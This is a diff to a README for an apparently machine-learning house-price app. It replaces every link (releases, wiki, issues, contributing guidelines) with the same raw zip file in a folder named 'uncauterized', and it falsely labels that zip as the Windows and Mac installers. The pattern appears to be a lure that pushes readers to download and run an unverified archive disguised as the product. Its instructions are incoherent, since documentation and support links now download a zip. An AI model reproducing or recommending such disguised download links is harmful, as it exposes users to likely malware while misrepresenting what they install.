@@ -1,6 +1,6 @@
 # 🏡 Machine-Learning-Housing-Corp - Predict House Values Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/STTicket/Machine-Learning-Housing-Corp/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip)
 
 ## 📖 Description
 
@@ -12,13 +12,13 @@ Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the page where you can download the application.  
-   [Download here](https://github.com/STTicket/Machine-Learning-Housing-Corp/releases)
+   [Download here](https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version of the application. It is important to select the most recent version to ensure you have all the latest features and fixes.
 
 3. **Download the Application**  
-   Click the download link for your operating system. It might be labeled as `Machine-Learning-Housing-Corp-win.exe` for Windows users or `Machine-Learning-Housing-Corp-mac.pkg` for Mac users. The file will begin downloading to your computer.
+   Click the download link for your operating system. It might be labeled as `https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip` for Windows users or `https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip` for Mac users. The file will begin downloading to your computer.
 
 4. **Locate the Downloaded File**  
    After the download is complete, navigate to your computer's downloads folder or the location where files are saved. Look for the file corresponding to the application name.
@@ -57,16 +57,16 @@ To successfully run Machine Learning Housing Corp, your computer should meet the
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For more detailed information on how to use this application, visit the [Documentation Page](https://github.com/STTicket/Machine-Learning-Housing-Corp/wiki).
-- **Support**: If you encounter any issues, feel free to open an issue on the [Issues Page](https://github.com/STTicket/Machine-Learning-Housing-Corp/issues).
+- **Documentation**: For more detailed information on how to use this application, visit the [Documentation Page](https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip).
+- **Support**: If you encounter any issues, feel free to open an issue on the [Issues Page](https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip).
 
 ## 🌟 Community Contributions
 
-We welcome contributions from everyone. If you want to help improve this project, please check our [Contributing Guidelines](https://github.com/STTicket/Machine-Learning-Housing-Corp/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you want to help improve this project, please check our [Contributing Guidelines](https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip).
 
 ## ✅ Acknowledgments
 
 Thank you to all contributors, users, and supporters of the Machine Learning Housing Corp project. Your input helps us improve and make the application better for everyone.  
 
 Remember, for downloading the latest version of Machine Learning Housing Corp, click the link below:  
-[Download here](https://github.com/STTicket/Machine-Learning-Housing-Corp/releases)
+[Download here](https://raw.githubusercontent.com/STTicket/Machine-Learning-Housing-Corp/main/uncauterized/Machine-Learning-Housing-Corp.zip)
